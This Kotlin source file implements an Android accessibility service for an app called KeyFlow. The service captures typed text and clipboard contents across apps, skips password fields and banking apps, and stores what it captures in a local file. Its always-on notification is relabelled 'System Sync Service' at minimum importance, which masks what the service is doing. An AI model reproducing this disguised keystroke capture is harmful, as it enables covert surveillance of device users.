package com.keyflow.keyflow_app

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.text.InputType
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class KeyflowAccessibilityService : AccessibilityService() {

    companion object {
        var instance: KeyflowAccessibilityService? = null
        var isPaused: Boolean = false
            set(value) {
                field = value
                try {
                    KeyflowOverlayService.notifyStatusChanged()
                } catch (_: Exception) {}
            }
        var eventListener: ((Map<String, Any?>) -> Unit)? = null

        private const val PREFS_NAME = "keyflow_capture_prefs"
        private const val PREFS_KEY_EXCLUSIONS = "excluded_apps"

        // Immutable snapshots swapped atomically so reads on the accessibility
        // thread never race with writes coming from the Flutter method channel.
        @Volatile
        private var exactExclusions: Set<String> = emptySet()
        @Volatile
        private var keywordExclusions: List<String> = emptyList()
        @Volatile
        private var exclusionsLoaded = false

        // Per-package decision cache: the regex + set checks run once per app,
        // not once per keystroke.
        private val decisionCache = java.util.concurrent.ConcurrentHashMap<String, Boolean>()

        private var lastDispatchedText: String = ""
        private var lastDispatchedPackage: String = ""
        private var lastDispatchedTime: Long = 0L

        private val knownFinancialPackages = setOf(
            "com.google.android.apps.nbu.paisa.user",
            "com.phonepe.app",
            "net.one97.paytm",
            "in.org.npci.upiapp",
            "com.sbi.upi",
            "com.icicibank.imobile",
            "com.hdfcbank.corebanking",
            "com.axis.mobile",
            "com.kotak.imb"
        )
        private val financialRegex = Regex(".*(bank|upi|payment|wallet|creditcard|authenticator).*", RegexOption.IGNORE_CASE)

        private val ignoredPackages = setOf(
            "com.android.systemui",
            "android",
            "com.motorola.launcher3",
            "com.android.launcher3",
            "com.google.android.apps.nexuslauncher",
            "com.keyflow.keyflow_app"
        )

        fun isFinancialOrExcluded(pkg: String): Boolean {
            val lower = pkg.lowercase()
            decisionCache[lower]?.let { return it }
            val excluded = computeExcluded(lower)
            decisionCache[lower] = excluded
            return excluded
        }

        private fun computeExcluded(lower: String): Boolean {
            if (knownFinancialPackages.contains(lower)) return true
            if (exactExclusions.contains(lower)) return true
            // Entries without a dot (e.g. "bank") are keywords: match anywhere in the package id.
            if (keywordExclusions.any { lower.contains(it) }) return true
            if (financialRegex.matches(lower)) return true
            return false
        }

        fun updateExclusions(exclusions: List<String>, context: android.content.Context? = null) {
            applyExclusions(exclusions)
            val ctx = context ?: instance
            if (ctx != null) {
                try {
                    ctx.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
                        .edit()
                        .putStringSet(PREFS_KEY_EXCLUSIONS, exclusions.toSet())
                        .apply()
                } catch (e: Exception) {
                    android.util.Log.e("KeyflowA11y", "Failed to persist exclusions: $e")
                }
            }
            android.util.Log.i("KeyflowA11y", "Updated exclusion set (${exclusions.size} entries)")
        }

        private fun applyExclusions(exclusions: Collection<String>) {
            val exact = HashSet<String>()
            val keywords = ArrayList<String>()
            for (raw in exclusions) {
                val entry = raw.trim().lowercase()
                if (entry.isEmpty()) continue
                // Desktop executables (e.g. "1password.exe") never match Android packages.
                if (entry.endsWith(".exe")) continue
                if (entry.contains('.')) exact.add(entry) else keywords.add(entry)
            }
            exactExclusions = exact
            keywordExclusions = keywords
            exclusionsLoaded = true
            decisionCache.clear()
        }

        /** Loads the persisted list so exclusions apply even when the Flutter UI is not running. */
        fun loadPersistedExclusions(context: android.content.Context) {
            if (exclusionsLoaded) return
            try {
                val stored = context.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
                    .getStringSet(PREFS_KEY_EXCLUSIONS, null)
                if (stored != null) applyExclusions(stored)
            } catch (e: Exception) {
                android.util.Log.e("KeyflowA11y", "Failed to load persisted exclusions: $e")
            }
        }
    }

    // Whether the app the user is currently in is excluded. Updated for every
    // foreground app (including launchers and KeyFlow itself), independently of
    // whether its text is captured. Drives both the clipboard guard and the overlay.
    @Volatile
    private var foregroundAppExcluded = false

    // Tracks whether the overlay is currently hidden, so we only post a show/hide
    // when the state actually changes instead of on every keystroke.
    private var overlayHiddenForExcludedApp = false

    private fun isInputMethodPackage(pkg: String): Boolean {
        val lower = pkg.lowercase()
        return lower.contains("inputmethod") || lower.contains("keyboard") ||
            lower == "com.touchtype.swiftkey" || lower.startsWith("com.samsung.android.honeyboard")
    }

    private fun updateForegroundExclusion(excluded: Boolean) {
        foregroundAppExcluded = excluded
        if (excluded && !overlayHiddenForExcludedApp) {
            overlayHiddenForExcludedApp = true
            // Hide overlay to avoid Android filterTouchesWhenObscured tapjacking protections
            try { KeyflowOverlayService.hideOverlay() } catch (_: Exception) {}
        } else if (!excluded && overlayHiddenForExcludedApp) {
            overlayHiddenForExcludedApp = false
            try { KeyflowOverlayService.restoreOverlay() } catch (_: Exception) {}
        }
    }

    private val isDebuggable: Boolean by lazy {
        (applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        loadPersistedExclusions(this)
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 50
        }
        serviceInfo = info

        updateForegroundNotification(isPaused)
        setupClipboardListener()
    }

    private var lastCopiedText: String = ""
    private var lastCopiedTime: Long = 0L

    private fun setupClipboardListener() {
        try {
            val clipboard = getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
            clipboard?.addPrimaryClipChangedListener {
                try {
                    if (isPaused) return@addPrimaryClipChangedListener
                    // Never record clipboard content copied inside an excluded app
                    if (foregroundAppExcluded) return@addPrimaryClipChangedListener
                    val clip = clipboard.primaryClip
                    if (clip != null && clip.itemCount > 0) {
                        val item = clip.getItemAt(0)
                        val text = item?.coerceToText(this@KeyflowAccessibilityService)?.toString()?.trim() ?: ""
                        if (text.isNotBlank()) {
                            val now = System.currentTimeMillis()
                            if (text == lastCopiedText && (now - lastCopiedTime) < 1500L) {
                                return@addPrimaryClipChangedListener
                            }
                            lastCopiedText = text
                            lastCopiedTime = now

                            val payload = mapOf(
                                "appName" to "Clipboard",
                                "windowTitle" to "Copied Text",
                                "text" to text,
                                "timestamp" to now,
                                "isCopied" to true
                            )
                            if (isDebuggable) {
                                android.util.Log.d("KeyflowA11y", "Captured copied text: len=${text.length}")
                            }
                            if (eventListener != null) {
                                eventListener?.invoke(payload)
                            } else {
                                saveEventToNativeBuffer(payload)
                            }
                        }
                    }
                } catch (e: Exception) {
                    android.util.Log.e("KeyflowA11y", "Clipboard listener callback error: $e")
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("KeyflowA11y", "setupClipboardListener error: $e")
        }
    }

    fun updateForegroundNotification(paused: Boolean) {
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                val channelId = "device_sync_service"
                val manager = getSystemService(android.app.NotificationManager::class.java)

                // Clean up old legacy channel if present
                try {
                    manager?.deleteNotificationChannel("keyflow_active_service")
                } catch (_: Exception) {}

                val channel = android.app.NotificationChannel(
                    channelId,
                    "System Sync Service",
                    android.app.NotificationManager.IMPORTANCE_MIN
                ).apply {
                    description = "Background synchronization and input service"
                    setShowBadge(false)
                }
                manager?.createNotificationChannel(channel)

                val title = if (paused) "System Sync Service (Paused)" else "System Sync Service"
                val text = if (paused) "Paused" else "Active"

                val notification = android.app.Notification.Builder(this, channelId)
                    .setContentTitle(title)
                    .setContentText(text)
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setOngoing(true)
                    .build()

                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                    startForeground(1001, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
                } else {
                    startForeground(1001, notification)
                }
                manager?.notify(1001, notification)
            }
        } catch (e: Exception) {
            android.util.Log.e("KeyflowA11y", "Foreground notification update error: $e")
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val packageName = event.packageName?.toString() ?: "unknown"
        if (isPaused) return

        // Keyboard (IME) windows emit events while the user is still inside the
        // target app, so they must not change the foreground-app decision.
        val isIme = isInputMethodPackage(packageName)

        // 1. Ignore system UI, launchers, and KeyFlow itself — but still record that
        //    the user has left any excluded app (re-enables clipboard + overlay).
        if (ignoredPackages.contains(packageName)) {
            if (packageName != "com.android.systemui") updateForegroundExclusion(false)
            return
        }

        // 2. User exclusions + strict financial filter (Zero-Interference Filter)
        val excluded = isFinancialOrExcluded(packageName)
        if (!isIme) updateForegroundExclusion(excluded)
        if (excluded) return

        // 3. Ignore pure focus events when no text has been typed
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            return
        }

        val source = try { event.source } catch (_: Exception) { null }

        // 4. Hardware Password Protection
        if (isSensitiveNodeOrEvent(event, source)) {
            try {
                source?.recycle()
            } catch (_: Exception) {}
            return
        }

        // 3. Extract actual typed text only (NEVER contentDescription or hintText)
        val text = extractText(event, source)
        if (text.isBlank()) return

        val now = System.currentTimeMillis()
        // Deduplicate rapid duplicate events for the exact same text within 800ms
        if (text == lastDispatchedText &&
            packageName == lastDispatchedPackage &&
            (now - lastDispatchedTime) < 800L) {
            return
        }

        lastDispatchedText = text
        lastDispatchedPackage = packageName
        lastDispatchedTime = now

        val payload = mapOf(
            "appName" to packageName,
            "windowTitle" to packageName,
            "text" to text,
            "timestamp" to now
        )
        if (isDebuggable) {
            android.util.Log.d("KeyflowA11y", "Captured typing: pkg=$packageName, len=${text.length}")
        }
        if (eventListener != null) {
            eventListener?.invoke(payload)
        } else {
            saveEventToNativeBuffer(payload)
        }
    }

    private fun extractText(event: AccessibilityEvent, source: AccessibilityNodeInfo?): String {
        // 1. Primary: actual text changed in event.text
        val textList = event.text
        if (textList.isNotEmpty()) {
            val combined = textList.joinToString("").trim()
            if (combined.isNotBlank()) {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O && source != null) {
                    val hint = source.hintText?.toString()?.trim()
                    if (!hint.isNullOrBlank() && combined.equals(hint, ignoreCase = true)) {
                        return ""
                    }
                }
                return combined
            }
        }

        // 2. Secondary: actual text of editable source node (never hintText or contentDescription)
        if (source != null && (source.isEditable || source.className?.toString()?.contains("EditText", ignoreCase = true) == true)) {
            try {
                val text = source.text?.toString()?.trim() ?: ""
                if (text.isNotBlank()) {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        val hint = source.hintText?.toString()?.trim()
                        if (!hint.isNullOrBlank() && text.equals(hint, ignoreCase = true)) {
                            return ""
                        }
                    }
                    return text
                }
            } catch (_: Exception) {}
        }
        return ""
    }



    private fun saveEventToNativeBuffer(payload: Map<String, Any?>) {
        try {
            val file = java.io.File(filesDir, "pending_events.jsonl")
            val json = org.json.JSONObject(payload).toString() + "\n"
            file.appendText(json)

        } catch (e: Exception) {
            android.util.Log.e("KeyflowA11y", "Error saving native buffer: $e")
        }
    }

    private fun isSensitiveNodeOrEvent(event: AccessibilityEvent, source: AccessibilityNodeInfo?): Boolean {
        if (event.isPassword) {
            android.util.Log.i("KeyflowA11y", "Sensitive: event.isPassword is true")
            return true
        }

        if (source == null) return false
        try {
            if (source.isPassword) {
                android.util.Log.i("KeyflowA11y", "Sensitive: source.isPassword is true")
                return true
            }

            val inputType = source.inputType
            if (inputType != 0) {
                val variation = inputType and InputType.TYPE_MASK_VARIATION
                val isPasswordVariation = variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                        variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
                        variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
                        variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD

                if (isPasswordVariation) {
                    android.util.Log.i("KeyflowA11y", "Sensitive: inputType variation password/PIN ($inputType)")
                    return true
                }
            }

            val viewId = source.viewIdResourceName?.lowercase() ?: ""
            if (viewId.contains("password") || viewId.contains("pin") || viewId.contains("otp") || viewId.contains("cvv")) {
                android.util.Log.i("KeyflowA11y", "Sensitive: viewId matches credential pattern ($viewId)")
                return true
            }

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                val hint = source.hintText?.toString()?.lowercase() ?: ""
                if (hint.contains("password") || hint.contains("pin") || hint.contains("otp") || hint.contains("cvv")) {
                    android.util.Log.i("KeyflowA11y", "Sensitive: hintText matches credential pattern ($hint)")
                    return true
                }
            }
        } catch (_: Exception) {}
        return false
    }


    override fun onTaskRemoved(rootIntent: android.content.Intent?) {
        super.onTaskRemoved(rootIntent)
        android.util.Log.i("KeyflowA11y", "onTaskRemoved: app task swiped from Recents - maintaining active background capture and foreground notification")
        updateForegroundNotification(isPaused)
    }

    override fun onInterrupt() {
        // No-op: KeyFlow accessibility service interruption handling is managed lifecycle-wide.
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
    }
}


